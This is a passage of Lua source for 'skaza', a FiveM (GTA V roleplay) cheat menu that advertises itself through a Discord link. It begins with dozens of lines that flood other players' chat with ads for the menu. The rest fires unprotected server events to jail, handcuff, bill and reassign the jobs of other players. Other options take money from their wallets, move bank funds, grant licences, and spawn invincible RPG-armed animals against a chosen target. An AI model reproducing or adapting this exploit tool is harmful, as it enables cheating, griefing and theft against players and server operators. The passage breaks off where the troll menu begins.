				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
                elseif smiecaries('~h~~b~-»~w~ Opcje Wlasne', 'SelfMenu') then
                elseif smiecaries('~h~~b~-»~w~ Gracze Online', 'OnlinePlayerMenu') then
                elseif smiecaries('~h~~b~-»~w~ Menu Teleportow', 'TeleportMenu') then
                elseif smiecaries('~h~~b~-»~w~ Menu Pojazdow', 'VehicleMenu') then
                elseif smiecaries('~h~~b~-»~w~ Menu Broni', 'WeaponMenu') then
				elseif smiecaries('~h~~b~-» ~w~Skaza Addons', '\107\111\103\117\115\122\10') then
                elseif smiecaries('~h~~b~-»~w~ Opcje Lua', 'LuaMenu') then -- ~o~~h~:3
                elseif smiecaries('~h~~b~-»~w~ Zaawansowane Menu', '\65\100\118\77\10') then -- ~o~~h~xD
                elseif smiecaries('~h~~b~-» ~y~Napisy', 'crds') then			
                elseif piesaries('~h~~b~-» ~r~Panickey') then
				
                    triggerr = false
                end
                if triggerr then
                    skaza.Display()
                end
            elseif skaza.IsMenuOpened('SelfMenu') then
                if smiecaries('~h~~b~-»~w~ ESX Triggers', 'ESXTriggersSelf') then
                elseif
                    jariesa(
                        '~h~~g~Godmode',
                        Godmode,
                        function(dR)
                            Godmode = dR
                        end
                    )
               
                 then
                elseif piesaries('~h~~y~Polowiczny ~g~Godmode') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        pizda(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(-1),
                        GetPedBoneIndex(GetPlayerPed(-1), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif
                    jariesa(
                        '~h~~g~Widocznosc gracza',
                        d4,
                        function(dR)
                            d4 = dR
                        end
                    )
                 then
                elseif piesaries('~h~~r~Samobojstwo') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif piesaries("~h~~g~Ulecz") then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif piesaries("~h~~w~Armor") then
                    SetPedArmour(PlayerPedId(-1), 200)
                elseif
                    jariesa(
                        '~h~Nieskonczona stamina',
                        InfStamina,
                        function(dR)
                            InfStamina = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~o~Termowizja',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    jariesa(
                        '~h~Szybki Bieg',
                        fastrun,
                        function(dR)
                            fastrun = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Super Skok',
                        SuperJump,
                        function(dR)
                            SuperJump = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Noclip',
                        Noclip,
                        function(dR)
                            Noclip = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
                            smiecaries(
                                '~b~-» ~w~' .. GetPlayerName(i) .. ' ~p~[' .. GetPlayerServerId(i) .. ']~w~ ~y~[' ..
                                i .. ']~w~ ' .. (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~ZGON' or
                                '~h~~g~ZYJE'),
                                'PlayerOptionsMenu'
                            )
                     then
                        SelectedPlayer = i
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('PlayerOptionsMenu') then
                skaza.SetSubTitle('PlayerOptionsMenu', 'Opcje Gracza [' .. GetPlayerName(SelectedPlayer) .. ']')
				if piesaries('~h~SPECTUJ', cC and '~g~[SPECTUJESZ]') then
                    SpectatePlayer(SelectedPlayer)
                elseif smiecaries('~h~~b~-»~w~ ESX Triggers', 'ESXTriggerini') then
                elseif smiecaries('~h~~b~-»~w~ ESX Prace', 'ESXJobs2') then
                elseif smiecaries('~h~~b~-»~w~ VRP Triggersy', 'VRPPlayerTriggers') then
                elseif smiecaries('~h~~b~-»~w~ Beka.exe', 'Trollmenu') then
                elseif piesaries('~h~~r~Polowiczna niesmiertelnosc') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        pizda(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif piesaries('~h~~g~Ulecz ~w~Gracza') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif piesaries('~h~~w~Dodaj ~w~armor') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif piesaries('~h~~w~Dodaj full ~w~Armoru') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
                elseif piesaries('~h~Tepnij y/n') then
                    if cO then
                        local confirm = KeyboardInput('na pewno? y/n', '', 0)
                        if confirm == 'y' then
                            local Entity =
                                IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                                PlayerPedId(-1)
                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                        elseif confirm == 'n' then
                            av('~h~~w~Operation cancelled~w~.', false)
                        else
                            av('~h~~w~Invalid Confirmation~w~.', true)
                            av('~h~~w~Operation cancelled~w~.', false)
                        end
                    else
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    end
                elseif
                    jariesa(
                        '~h~Zamroz gracza',
                        freezeplayer,
                        function(dR)
                            freezeplayer = dR
                        end
                    )
                 then
                elseif smiecaries('~h~~b~-»~w~ Dodaj bron', 'GiveSingleWeaponPlayer') then
                elseif piesaries('~h~Dodaj ~r~Wszystkie bronie') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif piesaries('~h~Usun ~r~wszystkie bronie') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif piesaries('~h~Daj ~r~Auto') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
                    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
                        pizda(cb)
                        while not HasModelLoaded(cb) do
                            Citizen.Wait(0)
                        end
                        local veh =
                            CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
                    else
                        av('~w~Model is not valid!', true)
                    end
                elseif piesaries('~h~Wyslij do ~r~Wiezienia') then
                    jebacariesa('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, '\115\107\97\122\97\86\10')
                    jebacariesa('esx_jailer:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    jebacariesa('esx_jail:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    jebacariesa('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, '\115\107\97\122\97\86\10')
                elseif piesaries('~h~~g~Wyciagnij ~w~z Wiezienia') then
                    jebacariesa('esx-qalle-jail:unJailPlayer', GetPlayerServerId(SelectedPlayer))
                    jebacariesa('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
                    jebacariesa('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
                    jebacariesa('js:jailuser', GetPlayerServerId(SelectedPlayer), 0, 'escaperino')
                elseif piesaries('~h~Wyslij do ~r~Community Service') then
                    jebacariesa('esx_communityservice:sendToCommunityService', GetPlayerServerId(SelectedPlayer), 60)
                elseif piesaries('~h~~g~Wyciagnij ~w~z ~r~Community Service') then
                    jebacariesa('esx_communityservice:endCommunityServiceCommand', GetPlayerServerId(SelectedPlayer))
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXTriggersSelf') then
                    if piesaries('~h~~g~ESX ~w~Revive Siebie~w~') then
                        chujaries('esx_ambulancejob:revive')
                        chujaries('ambulancier:selfRespawn')
                    elseif piesaries('~h~~g~ESX ~w~Otworz menu wiezienia~w~') then
                        chujaries("esx-qalle-jail:openJailMenu")
                    elseif piesaries("~h~~g~ESX ~w~Wyciagnij ~r~z wiezienia") then
                        jebacariesa('esx_jailer:unjailTime', -1)
                        jebacariesa('JailUpdate', 0)
                        chujaries('UnJP')
                        chujaries('esx-qalle-jail:unJailPlayer')
                    elseif piesaries("~h~~g~ESX ~w~Wyciagnij z ~r~Community Service") then
                        jebacariesa('esx_communityservice:finishCommunityService')
                    elseif piesaries("~h~Najedz") then
                        chujaries("esx_status:set", "hunger", 1000000)
                    elseif piesaries("~h~Napoj") then
                        chujaries("esx_status:set", "thirst", 1000000)
                    end
				skaza.Display()
					elseif skaza.IsMenuOpened('\101\115\120\121\10') then
							if piesaries('~h~~g~ESX ~w~Revive Yourself~w~') then
                        chujaries('esx_ambulancejob:revive')
                        chujaries('ambulancier:selfRespawn')
					elseif piesaries('~h~~g~Jail ~w~Edited~w~') then
						av ('Zmien trigger jaki ma wyspa')
					elseif piesaries('~h~~g~Plasterek gracza ~w~Obok~w~') then
						jebacariesa('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'big')
					elseif piesaries('~h~~g~Zbierz Karnister') then
						jebacariesa('esx_mecanojob:startHarvest')
					elseif piesaries('~h~~g~Zbierz Czesci Naprawcze') then
						jebacariesa('esx_mecanojob:startHarvest2')
					elseif piesaries('~h~~g~Przerob na Palnik') then
						jebacariesa('~h~~g~esx_mecanojob:startCraft')
					elseif piesaries("Dodaj wszystkie licencje ") then
					jebacariesa("dmv:success")
					jebacariesa('esx_weashopjob:addLicense', 'tazer')
					jebacariesa('esx_weashopjob:addLicense', 'ppa')
					jebacariesa('esx_weashopjob:addLicense', 'ppa2')
					jebacariesa('esx_weashopjob:addLicense', 'drive_bike')
					jebacariesa('esx_weashopjob:addLicense', 'drive_truck')
					jebacariesa('esx_dmvschool:addLicense', 'dmv')
					jebacariesa('esx_dmvschool:addLicense', 'drive')
					jebacariesa('esx_dmvschool:addLicense', 'drive_bike')
					jebacariesa('esx_dmvschool:addLicense', 'drive_truck')
					jebacariesa('esx_airlines:addLicense', 'helico')
					jebacariesa('esx_airlines:addLicense', 'avion')
					
					elseif piesaries('~h~~g~Koguty koguszka') then
						local bQ = 'a_c_hen'
						local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
						
					end
					skaza.Display()
					elseif skaza.IsMenuOpened('') then
					if piesaries('~h~~g~ESX ~w~Revive Yourself~w~') then
                        chujaries('esx_ambulancejob:revive')
                        chujaries('ambulancier:selfRespawn')
					end
                    skaza.Display()
            elseif skaza.IsMenuOpened('ESXTriggerini') then
                if piesaries('~h~~g~Open Inventory') then
                    chujaries("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
                elseif piesaries('~h~Send Bill') then
                    local bA=KeyboardInput("Enter amount","",100000000)
                    local ah=KeyboardInput("Enter the name of the bill","",100000000)
                    if bA and ah then 
                        jebacariesa('esx_billing:sendBill',GetPlayerServerId(SelectedPlayer),"5391 was here",ah,bA)
                    else
                        return
                    end
                elseif piesaries('~h~~g~Revive Player') then
                    local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    --jebacariesa('esx_ambulancejob:setDeathStatus', false)
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    RespawnPed(ax, dZ, 0.0)
                    --StopScreenEffect('DeathFailOut')
                    --DoScreenFadeIn(800)
                    jebacariesa('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
                elseif piesaries('~h~~g~Daj pieniadze graczowi z portfela') then
                    local m = KeyboardInput('Enter amount of money to give', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'esx:giveInventoryItem',
                            GetPlayerServerId(SelectedPlayer),
                            'item_money',
                            'money',
                            m
                        )
                    end
                elseif piesaries('~h~~w~Zakuj gracza') then
                    jebacariesa('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                elseif piesaries('~h~~r~Wsadz do wiezienia') then
                    jebacariesa(
                        'esx-qalle-jail:jailPlayer',
                        GetPlayerServerId(SelectedPlayer),
                        5000,
                        'unknown'
                    )
                    jebacariesa('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
                    jebacariesa('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
                    jebacariesa('js:jailuser', GetPlayerServerId(SelectedPlayer), 45 * 60, 'unknown')
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('VRPPlayerTriggers') then
                if piesaries('~h~Przelej pieniadze z banku') then
                    local d_ = KeyboardInput('Enter amount of money to give', '', 100)
                    local e0 = KeyboardInput('Enter VRP PERMA ID!', '', 100)
                    if d_ ~= '' then
                        local di = GetPlayerServerId(PlayerId())
                        chujaries('bank:transfer', di, GetPlayerServerId(SelectedPlayer), d_)
                        jebacariesa('bank:transfer', e0, d_)
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXJobs2') then
                if piesaries('~h~Set Unemployed') then
                    jebacariesa('NB:destituerplayer', GetPlayerServerId(SelectedPlayer))
                    UnemployedPlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~w~Police ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'police', 3)
                    PolicePlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~o~Mecano ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'mecano', 3)
                    MecanoPlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~y~Taxi ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'taxi', 3)
                    TaxiPlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~r~Ambulance ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'ambulance', 3)
                    AmbulancePlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~g~Real Estate ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'realestateagent', 3)
                    RealEstateAgentPlayer(SelectedPlayer)
                elseif piesaries('~h~Set ~r~Car ~w~Dealer ~w~Prace') then
                    jebacariesa('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'cardealer', 3)
                    CarDealerPlayer(SelectedPlayer)
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('Trollmenu') then
